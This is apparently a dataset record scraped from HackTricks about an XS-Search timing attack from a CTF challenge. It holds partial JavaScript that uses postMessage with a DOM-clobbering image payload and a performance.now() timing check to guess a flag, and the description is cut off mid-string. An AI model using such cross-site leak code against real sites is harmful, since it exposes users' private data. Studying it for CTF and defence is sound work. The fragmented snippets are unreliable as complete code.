{
  "id": "pentesting_web_bcecd8dc8ec2",
  "category": "pentesting-web",
  "title": "performance.now example",
  "description": "# performance.now example\n\n{{#include ../../banners/hacktricks-training.md}}\n\n**Example taken from [https://ctf.zeyu2001.com/2022/nitectf-2022/js-api](https://ctf.zeyu2001.com/2022/nitectf-2022/js-api)**\n\n```javascript\nconst sleep = (ms) => new Promise((res) => setTimeout(res, ms))\n\nasync function check(flag) {\n  let w = frame.contentWindow\n  w.postMessage(\n    { op: \"preview\", payload: '<img name=\"enable_experimental_features\">' },\n    \"*\"\n  )\n  await sleep(1)\n  w.postMessage({ op: \"search\", pa",
  "payloads": [
    "# performance.now example",
    "{{#include ../../banners/hacktricks-training.md}}",
    "**Example taken from [https://ctf.zeyu2001.com/2022/nitectf-2022/js-api](https://ctf.zeyu2001.com/2022/nitectf-2022/js-api)**",
    "```javascript",
    "const sleep = (ms) => new Promise((res) => setTimeout(res, ms))",
    "async function check(flag) {",
    "let w = frame.contentWindow",
    "w.postMessage(",
    "{ op: \"preview\", payload: '<img name=\"enable_experimental_features\">' },",
    "await sleep(1)",
    "w.postMessage({ op: \"search\", payload: flag }, \"*\")",
    "let t1 = performance.now()",
    "await sleep(1)",
    "return performance.now() - t1 > 200",
    "async function main() {"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/pentesting-web/xs-search/performance.now-example.md"
  ]
}